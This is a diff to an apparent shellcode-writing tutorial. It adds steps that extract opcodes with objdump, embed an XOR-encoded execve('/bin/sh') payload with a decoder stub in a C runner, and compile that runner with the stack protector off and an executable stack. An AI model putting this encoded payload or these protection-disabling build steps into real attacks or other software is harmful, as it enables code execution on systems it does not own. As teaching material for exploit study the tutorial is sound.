@@ -33,8 +33,8 @@ _start:
 
 #### 2) Compile it
 ```bash
-$ nasm -f elf32 -o execve_04_sh_stack execve_04_sh_stack.nasm
-$ ld -o execve_04_sh_stack execve_04_sh_stack.o
+nasm -f elf32 -o execve_04_sh_stack execve_04_sh_stack.nasm
+ld -o execve_04_sh_stack execve_04_sh_stack.o
 ```
 
 #### 3) Extract shellcode from the binary
@@ -83,7 +83,32 @@ call_decoder:
 
 #### 6) Compile it
 ```bash
-$ nasm -f elf32 -o xor_01_sh_loop xor_01_sh_loop.nasm
-$ ld -o xor_01_sh_loop xor_01_sh_loop.o
+nasm -f elf32 -o xor_01_sh_loop xor_01_sh_loop.nasm
+ld -o xor_01_sh_loop xor_01_sh_loop.o
 ```
 
+#### 7) Extract shellcode from the binary
+```bash
+objdump -d ./xor_01_sh.loop | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
+```
+
+#### 8) Add the extracted shellcode to "shellcode.c" (Shellcode Skeleton)
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
+
+main()
+{
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+```
+
+#### 9) Compile the "shellcode.c"
+```bash
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+```
